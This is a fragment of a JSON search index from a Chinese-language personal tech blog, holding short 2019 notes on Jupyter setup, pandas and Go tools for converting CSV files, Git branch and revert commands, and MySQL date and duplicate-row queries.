","date":"2019-09-01","objectID":"/blog/posts/JS-%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E5%81%9A%E5%88%B0-jQuery-one-%E4%BA%8B%E4%BB%B6/:0:0","tags":["javascript"],"title":"JS 原生方法做到 jQuery one 事件","uri":"/blog/posts/JS-%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E5%81%9A%E5%88%B0-jQuery-one-%E4%BA%8B%E4%BB%B6/"},{"categories":["實用工具"],"content":"還在整理中… 簡單說一下 QPS = request / sec 測試高併發的時候可以使用這個 谈谈并发的一些基础概念 | BoxCore hey壓力測試工具介紹 - V218筆記 谈谈并发的一些基础概念 | BoxCore QPS、PV和需要部署机器数量计算公式 | Web开发笔记 ","date":"2019-08-30","objectID":"/blog/posts/Hey-%E5%A3%93%E5%8A%9B%E6%B8%AC%E8%A9%A6%E5%B7%A5%E5%85%B7/:0:0","tags":["hey","jmeter"],"title":"Hey 壓力測試工具","uri":"/blog/posts/Hey-%E5%A3%93%E5%8A%9B%E6%B8%AC%E8%A9%A6%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"最近看到有人拿 Jupyter 做筆記 之前都不知清楚有什麼作用 不過有看到有人拿來做一些程式筆記 裡面也可以寫 Markdown 文件 今天就來安裝玩玩 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"anaconda 裡面包含 Jupyter Notebook ,pandas…. 所以我選擇安裝這個 快速完成環境 PS: Apache Zeppelin 也有類似的功能 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"安裝套件 jupyter notebook 可以做哪些事情？ - 知乎 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"Snippets 因為 python 不熟，安裝這個可以快速使用 安裝方法 git clone git://github.com/moble/jupyter_boilerplate jupyter nbextension install jupyter_boilerplate jupyter nbextension enable jupyter_boilerplate/main ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:2:1","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"自動補字 安裝方法 安裝前記得要先把 jupyter 關掉!!!! 安裝 如果之前安裝過顯示目錄功能的話，這一步驟可以跳過。 pip install jupyter_contrib_nbextensions 配置 安裝完之後需要配置 nbextension，注意配置的時候要確保已關閉 Jupyter Notebook： jupyter contrib nbextension install –user –skip-running-check 啟動 Jupyter Notebook，勾選設置 上面兩個步驟都沒報錯後，啟動 Jupyter Notebook，上面選項欄會出現 Nbextensions 的選項 作者：caoqi95 链接：https://www.jianshu.com/p/0ab80f63af8a 来源：简书 简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 Jupyter Notebook 添加代码自动补全功能 - 简书 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:2:2","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"csv 轉 xlsx pandas 可以方便做很多東西 例如資料轉換格式 真的非常方便許多 from __future__ import print_function, division import pandas as pd bp_data = pd.read_csv(\"FL_insurance_sample.csv\") bp_data.to_excel('test.xlsx',index=False) ipynb檔案 參考範例:【python】pandas库pd.to_excel操作写入excel文件参数整理与实例 - brucewong0516的博客 - CSDN博客 Sample CSV Data – SpatialKey Support csv來源從這邊來 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"pandas 一些應用 可以抓取重複資料，但不知道大檔案處理速度不知道能不能負荷 pandas使用技巧【18】找到和移除重复行 - 简书 資料處理：用pandas處理大型csv檔案 - IT閱讀 Pandas之drop_duplicates：去除重复项 - OraYang的博客 - CSDN博客 python - how to transform pandas dataframe for insertion via executemany() statement? - Stack Overflow How to write python sql output into CSV using a dataframe - Stack Overflow python - SQL statement for CSV files on IPython notebook - Stack Overflow 【精心解读】关于Jupyter Notebook的28个技巧 - 知乎 類似 SQL 應用 How to rewrite your SQL queries in Pandas, and more python 3.x - Removing duplicates between multiple large CSV files - Stack Overflow 常常有時候會收到一些 Excel 要產生 SQL 語句 但是看一下內建to_sql 好像直接對csv匯入… 可能還是需要用 有機會應用在補充 ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:4:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"連 Oracle 在Python用cx_Oracle去操作Oracle資料庫 | Ching-Chuan Chen’s Blogger ","date":"2019-08-30","objectID":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/:5:0","tags":["jupyter"],"title":"Jupyter Notebook 使用初體驗","uri":"/blog/posts/Jupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"最近使用 Outlook 匯入一些規則 但相關規則會做搬移信件到其他資料夾 由於規則非常多，所以我需要建置一些資料夾 想說有什麼快速方法， Google 一下好用方法 來記錄一下非常快速方法 點擊「檔案」→「資訊」頁→「清理工具」，選擇「封存」， 選擇要複製的來源資料檔、目的資料檔路徑， 指定封存日期早於任何一封郵件的日期， 即可複製一個只有空資料夾的pst檔。 參考: [Outlook] 複製Outlook資料檔目錄結構 我用 Outlook 2010 方式可以順利完成!! 如何將文件夾結構複製到Outlook中的新的PST數據文件？ ","date":"2019-08-29","objectID":"/blog/posts/Outlook-%E8%A4%87%E8%A3%BD%E8%B3%87%E6%96%99%E5%A4%BE%E5%8C%AF%E5%87%BA%E6%96%B9%E6%B3%95/:0:0","tags":["outlook"],"title":"Outlook 複製資料夾匯出方法","uri":"/blog/posts/Outlook-%E8%A4%87%E8%A3%BD%E8%B3%87%E6%96%99%E5%A4%BE%E5%8C%AF%E5%87%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"最近常常看哪些 branch 有做合併動作 我都使用gitk --all 看合併 但我覺得應該有很方便指令看的方法 官方文件有詳細說明 Git - 分支的管理 ","date":"2019-08-27","objectID":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"Git 查看合併分支並刪除方法","uri":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git branch –merged show 出來已經 merged 的分支 ","date":"2019-08-27","objectID":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/:1:0","tags":["git"],"title":"Git 查看合併分支並刪除方法","uri":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git branch –no-merged 以此類推，list出沒合併的分支 ","date":"2019-08-27","objectID":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/:2:0","tags":["git"],"title":"Git 查看合併分支並刪除方法","uri":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"其他備註 之前有做過Git刪除Rmote Branch方法 | 程式狂想筆記 看來local 端的 git branch 要自己 git branch -d xxx 沒辦法自動 delete 掉 git fetch -p or git fetch –all –prune 是清除本地的remote 暫存分支 相關連結 [git]如何快速清理已經合並(merged)的分支(branch) - local及remote @ Alan Tsai 的學習筆記｜An Asp .Net Mvc Web Developer Blog Git 的 Merge 與 Fast-Forward - Qiita 🌳🚀 CS Visualized: Useful Git Commands - DEV Community 👩‍💻👨‍💻 ","date":"2019-08-27","objectID":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/:3:0","tags":["git"],"title":"Git 查看合併分支並刪除方法","uri":"/blog/posts/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"好幾次採到 SQL 時間的地雷 今天來好好筆記 ","date":"2019-08-27","objectID":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["sql"],"title":"SQL 做時間判斷條件需要注意的事情","uri":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"datetime between ‘2019-01-01’ and ‘2019-02-01’ 這個時候需要注意!! 由於 between 沒有放入時間資料 查詢結果會是 2019-01-01 00:00:00 ~ 2019-02-01 00:00:00 所以需要使用 2019-01-01 00:00:00 ~ 2019-01-31 23:59:59 ","date":"2019-08-27","objectID":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:1:0","tags":["sql"],"title":"SQL 做時間判斷條件需要注意的事情","uri":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"MySQL ‘0000-00-00’ = 0 會是 true 之前讀到 MySQL ‘0000-00-00’ 可等於 null 但是 ‘0000-00-00’ = ’’ 會是 false ‘0000-00-00’ = 0 為 true 這邊就是隱式轉換 可看下面標題 ","date":"2019-08-27","objectID":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:2:0","tags":["sql"],"title":"SQL 做時間判斷條件需要注意的事情","uri":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"隱式轉換 ‘123_ff’ = 1 為true MySQL 隐式类型转换 - ZZZ’s blog 价值百万的 MySQL 的隐式类型转换 - 互联网技术和架构 MySQL隐式转化整理 - Rollen Holt - 博客园 其他想到在記錄!! ","date":"2019-08-27","objectID":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:3:0","tags":["sql"],"title":"SQL 做時間判斷條件需要注意的事情","uri":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"其他小記 Oracle时间类型数据为0的bug(0000-0-0) - 北国风光的专栏 - CSDN博客 ","date":"2019-08-27","objectID":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:4:0","tags":["sql"],"title":"SQL 做時間判斷條件需要注意的事情","uri":"/blog/posts/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["實用工具"],"content":"最近查詢報表 用 SQL 查詢 MySQL 資料，產生出 csv 檔案 但是在 Excel 直接打開會是亂碼，因為 DB 存放資料是 UTF-8 這個很簡單，使用 Notepad++ 或 vscode 改編碼就可以解決這個問題 改 Big5 裡面的韓語、日語就會變亂碼 其實可以手動到 Excel 匯入 我覺得需要有快速執行工具，就找找現成的 :P ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:0:0","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"tealeg/csv2xlsx 找了這麼多版，終於找到一款可以正常使用。 tealeg/csv2xlsx: A simple program to convert CSV files into XLSX files. ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:1:0","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"安裝方法 注意前面沒有http go get github.com/tealeg/csv2xlsx ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:1:1","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"使用方法 csv2xlsx -f=xxxx.csv -o=test.xlsx -d=, ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:1:2","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"移除 golang 程式方法 # 看看會做哪些動作，程式安裝在哪裡 go clean -i -n github.com/google/acme #移除程式 go clean -i github.com/google/acme 參考:Golang get 抓取的套件如何移除 | Tsung’s Blog ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:1:3","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"注意事項 需使用 UTF-8 csv 產生 Excel 為 utf8 big5 會亂碼 ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:1:4","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他的 csv2xlsx ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:2:0","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"bash 指令方法 SSConvert unoconv 但好像都是 Linux ，所以我就沒有嘗試 bash - convert CSV to XLS file on linux - Unix \u0026 Linux Stack Exchange ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:2:1","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他 mentax/csv2xlsx: Fast and simple opensource command line tool to convert CSV do XLSX Armin / csv2xlsx · GitLab csv2xlsx · PyPI kyoh86/csv2xlsx truesocialmetrics/service-file-format-convertor-csv2xlsx: convert files from csv to excel Golang get 抓取的套件如何移除 | Tsung’s Blog 2020-01-30 在想都有 csv2xlsx 應該有 xlsx2csv 吧 同一個作者有出tealeg/xlsx2csv: Convert XSLX files to CSV ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:2:2","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"安裝 go get github.com/tealeg/xlsx2csv ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:3:0","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"指令 xlsx2csv.exe -o testfile.csv testfile.xlsx ","date":"2019-08-26","objectID":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/:4:0","tags":["csv","xlsx"],"title":"csv2xlsx CSV 轉 Excel 方法","uri":"/blog/posts/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"最近想到 revert , cherry-pick 分支好像不能做 但只細看一下錯誤訊息 好像能使用 git revert -m 1 merge_commit_id -m 這個就是用在 (複製/退回)branch 用的 1 怎麼來的? 如上面的例子中，從 git show 命令的結果中可以看到，merge commit 的 parent 分別為 ba25a9d 和 1c7036f，其中 ba25a9d 代表 master 分支（從圖中可以看出），1c7036f 代表 will-be-revert 分支。需要注意的是 -m 選項接收的參數是一個數字，數字取值為 1 和 2，也就是 Merge 行裡面列出來的第一個還是第二個。 我們要 revert will-be-revert 分支上的內容，即 保留主分支，應該設置主分支為主線，操作如下： ➜ git revert -m 1 bd86846 Git 之 revert (撤銷commit或merge) - 我是guyue，guyue就是我O(∩_∩)O - CSDN博客 這邊 git show 指令可以看到兩個 merge commit_id 通常有兩個， 1 ,2 照順序 ➜ git show bd86846 commit bd868465569400a6b9408050643e5949e8f2b8f5 Merge: ba25a9d 1c7036f 這邊我有想到一個問題 revert branch 要怎麼用回來呢 繼續 revert ? 後來我覺得應該要再 merge commit id 就可以合併 但是看到這篇 revert commit 再次merge 可能需要注意的事情 Git 之 revert - 活到老学到老 - SegmentFault 思否 備份圖 這篇值得看 相關連結: Git怎样撤销一次分支的合并Merge - SegmentFault 思否 git revert merge 的commit - 杨博客 - 博客园 Git 之 revert - 活到老学到老 - SegmentFault 思否 git cherry-pick -m 例子 - SegmentFault 思否 ","date":"2019-08-21","objectID":"/blog/posts/Git-cherry-pick-revert-%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"Git cherry-pick, revert 合併分支的方法","uri":"/blog/posts/Git-cherry-pick-revert-%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"通常 csv 匯入現有 table 我今天要建立 table 但我很懶(逃) 在 stackoverflow 找到非常簡單的方法 database - Create mysql table directly from CSV file using the CSV Storage engine? - Stack Overflow #!/bin/sh # pass in the file name as an argument: ./mktable filename.csv echo \"create table $1 ( \" head -1 $1 | sed -e 's/,/ varchar(255),\\n/g' echo \" varchar(255) );\" 只要在 command line，參數打 csv 檔案名稱 sh xxx.sh xxx.csv 可以產生出 create table SQL ","date":"2019-08-21","objectID":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/:0:0","tags":["mysql"],"title":"csv 快速建立 MySQL 資料表方法","uri":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"匯入 CSV 由於我是用 Dbeaver 匯入(不知道 phpmyadmin不讓我匯入) 有空再來補 SQL 要怎麼做 結束這回合 我遇到資料有換行的問題 Dbeaver 可以正常執行 ","date":"2019-08-21","objectID":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/:1:0","tags":["mysql"],"title":"csv 快速建立 MySQL 資料表方法","uri":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"CSV 當作 SQL 撈取方法 最近在想取得 csv 如何快速當作 DB 查詢方法 發現 Dbeaver 可以使用這個方式Importing a CSV into a database using DBeaver | Just Numbers \u0026 Things 只是建立連線(CSV)，選一個資料夾，裡面的 csv 會當成 table 但手動組 SQL，由於不能設定主鍵，所以可能還需要而外建立table 這點有點可惜了，但我覺得還滿實用 須注意\\\"會導致查詢會有問題，建議先手動取代\\\"改別的符號 不知道是不是bug?? ","date":"2019-08-21","objectID":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/:2:0","tags":["mysql"],"title":"csv 快速建立 MySQL 資料表方法","uri":"/blog/posts/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"最近收到要抓出資料重複(資料量很大) 這看起來很簡單，但沒想到讓我想了很久要怎麼做 最後實作出來筆記一下 ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:0:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"EXCEL 過濾法 可以透過 Excel 抓重複資料 教學: Excel 找出重複內容，標示或刪除相同資料教學 - G. T. Wang 之後可以透過 Excel 篩選過濾抓出來(或刪掉) 但我發現我要查詢重複條件有2個以上，所以這招無效 我剛剛想到用兩個欄位尋找重複資料，再篩選多個資料 其實能不用寫程式方法最好 ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:1:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"SQL 簡單反查法 不推薦使用，但適合少資料使用 我們知道 MySQL 做重複資料可以用 group by 和 having count(1) \u003e 1 但是資料表唯一值id就會被過濾掉 這不是我們要的 可以透過重複欄位做 or 反查 但是我資料表資料太多 這招不行啊!!! ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:2:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"JOIN 方法 這一招可以簡單抓到我要的資料 但是代價就是需要時間跑 select a.id, a.xxxxxx (select xxxxxx from oooo r where id = a.vvvv) as v, a.xxx, a.xxxx (Select count(1) from s where s.vvv = a.vvvvv) count, (Select SUBSTRING(replace(min(i),'-',''),1,3) from s2 where s2.id = a.id) as s2_t from a1 a inner join a1 b on a.status=\"active\" and a.name = b.name and a.note = b.note and a.id != b.id group by a.id ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:3:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"最正規的作法 有查到可以用大數據的 MapReduce 感覺這種東西應該應用在大數據 只是我沒研究，就先放著 Mongo入门：数据去重之MapReduce，Aggregation的简单使用（另附相关网络资源） - V_code的博客 - CSDN博客 ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:4:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"Excel 備註小記 上述因為要抓多個資料，可以先跑一次 匯入到自己 localhost DB ，多個條件可以做index，這樣搜尋不用花太多時間 ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:5:0","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"csv檔案編碼 DB 是 UTF8 ， CSV 需要用 notepad++ 和 visual studio code 轉 Big5 否則 Excel 開會亂碼 ","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:5:1","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"多國語系貼到 Excel 要注意的事項 可以用 Excel 會入 csv 載入方式 (但需要注意有沒有資料有換行符號，可以先人工把放行用掉，正常應該不會遇到，但我資料有這樣orz) 匯入建議把所有資料變成文字，不然會發生資料跑錯欄位情形 其他相關連結: [MYSQL]利用 SQL 找出欄位值重覆的記錄 @ 紀錄些小事情 :: 痞客邦 :: 從MYSQL資料庫中找出重複的資料並刪除 @ 緒含的部落格 :: 痞客邦 :: 